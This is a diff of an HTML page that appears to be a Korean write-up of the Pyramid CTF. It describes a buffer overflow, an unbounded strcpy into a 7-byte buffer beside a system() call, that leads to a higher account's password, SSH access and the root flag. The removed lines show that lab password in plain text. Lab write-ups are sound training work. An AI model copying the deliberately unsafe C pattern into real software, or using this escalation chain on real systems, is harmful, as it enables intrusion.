+                </p>
 
-            <p>
-              각 <code>offering</code> 파일에는 C 코드 일부가 담겨 있었고,
-              이를 조합하면 <code>system()</code> 호출과 <code>strcpy(altar, offering)</code> 구문을 포함하는 하나의 C 프로그램이 완성되었다.
-            </p>
-
-            <pre class="code-block">
+                <pre class="code-block">
 char code[] = "touch /home/khufu/.&lt;encoded_path&gt;";
 int core = system(code);
 
 char guard[1];
 char altar[7];
-// ...
+
 strcpy(altar, offering);
-            </pre>
+                </pre>
 
-            <p>
-              <code>altar</code> 버퍼 크기보다 큰 입력을 <code>offering</code>에 주입하면
-              버퍼 오버플로우가 발생할 수 있고, 이를 통해 의도한 파일 생성이나 코드 흐름 제어가 가능하다는 점을 파악하였다.
-            </p>
+                <p>
+                  <code>altar</code> 버퍼 크기보다 큰 입력을 <code>offering</code>에 주입하면
+                  버퍼 오버플로우가 발생할 수 있고, 이를 통해 의도한 파일 생성이나 코드 흐름 제어가 가능하다는 점을 파악하였다.
+                </p>
+              </section>
+
+              <section>
+                <h3>3. book_pen 활용 및 상위 계정 획득</h3>
+                <p>
+                  room 디렉터리 내 <code>book_pen</code> 바이너리는 사용자의 입력을 <code>offering</code>에 반영하고,
+                  취약한 C 코드 로직을 수행하는 역할을 했다.
+                </p>
+
+                <figure>
+                  <img src="images/image048.png" alt="book_pen 실행 예시" />
+                  <figcaption>book_pen 바이너리 실행 및 입력 전달</figcaption>
+                </figure>
+
+                <p>
+                  특정 패턴의 입력을 사용하여 내부 로직이 숨겨진 경로에 파일을 생성하도록 유도하였고,
+                  이 과정을 통해 최종적으로 상위 계정(<code>tutankhamun</code>)에 대한 비밀번호를 추출해 SSH 접속에 성공하였다.
+                </p>
+
+                <figure>
+                  <img src="images/image059.jpg" alt="tutankhamun 패스워드 도출" />
+                  <figcaption>book_pen 실행 결과에서 tutankhamun 패스워드 도출</figcaption>
+                </figure>
+              </section>
+
+              <section>
+                <h3>4. 최종 root flag 획득</h3>
+                <p>
+                  <code>tutankhamun</code> 계정으로 로그인한 뒤, 상위 권한이 필요한 디렉터리와 파일을 탐색하여
+                  루트 디렉터리 내부에 위치한 최종 <code>flag</code> 파일을 확인하였다.
+                </p>
+
+                <figure>
+                  <img src="images/image061.png" alt="root 디렉터리에서 최종 flag 확인" />
+                  <figcaption>root 디렉터리 내 최종 flag 파일</figcaption>
+                </figure>
+
+                <p>
+                  파일 내용을 확인함으로써 Pyramid CTF 전 스테이지에 대한 공격 체인과 권한 상승 경로를
+                  모두 완주하였다.
+                </p>
+              </section>
+            </article>
           </section>
-
-          <section>
-            <h3>3. book_pen 활용 및 상위 계정 획득</h3>
-            <p>
-              room 디렉터리 내 <code>book_pen</code> 바이너리는 사용자의 입력을 <code>offering</code>에 반영하고,
-              취약한 C 코드 로직을 수행하는 역할을 했다.
-            </p>
-
-            <figure>
-              <img src="images/image048.png" alt="book_pen 실행 예시" />
-              <figcaption>book_pen 바이너리 실행 및 입력 전달</figcaption>
-            </figure>
-
-            <p>
-              특정 패턴의 입력을 사용하여 내부 로직이 숨겨진 경로에 파일을 생성하도록 유도하였고,
-              이 과정을 통해 최종적으로 상위 계정(<code>tutankhamun</code>)에 대한 비밀번호
-              <code>2gHsQQTDGYNerJuyFFGeUkFEVDj6</code>를 추출해 SSH 접속에 성공하였다.
-            </p>
-
-            <figure>
-              <img src="images/image059.jpg" alt="tutankhamun 패스워드 도출" />
-              <figcaption>book_pen 실행 결과에서 tutankhamun 패스워드 도출</figcaption>
-            </figure>
-          </section>
-
-          <section>
-            <h3>4. 최종 root flag 획득</h3>
-            <p>
-              <code>tutankhamun</code> 계정으로 로그인한 뒤, 상위 권한이 필요한 디렉터리와 파일을 탐색하여
-              루트 디렉터리 내부에 위치한 최종 <code>flag</code> 파일을 확인하였다.
-            </p>
-
-            <figure>
-              <img src="images/image061.png" alt="root 디렉터리에서 최종 flag 확인" />
-              <figcaption>root 디렉터리 내 최종 flag 파일</figcaption>
-            </figure>
-
-            <p>
-              파일 내용을 확인함으로써 Pyramid CTF 전 스테이지에 대한 공격 체인과 권한 상승 경로를
-              모두 완주하였다.
-            </p>
-          </section>
-        </article>
-      </section>
+        </section>
+      </div>
     </main>
   </body>
 </html>
